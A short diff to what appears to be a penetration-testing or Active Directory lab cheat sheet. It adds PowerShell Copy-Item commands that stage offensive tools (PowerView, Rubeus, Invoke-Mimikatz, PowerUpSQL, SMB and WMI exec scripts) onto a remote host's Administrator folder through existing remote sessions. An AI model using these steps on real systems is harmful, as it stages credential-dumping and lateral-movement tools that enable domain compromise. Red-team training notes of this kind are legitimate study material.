@@ -63,4 +63,11 @@ $cred = New-Object System.Management.Automation.PSCredential -ArgumentList @($us
 Invoke-Command -ComputerName $Host -Credential $cred -ScriptBlock  {hostname}
 Get-PSSession
 Enter-PsSession -id 1
+
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerView.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\rubeus.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-Mimikatz.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerUpSQL.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-SMBEnum.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-WMIExec.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
 ```
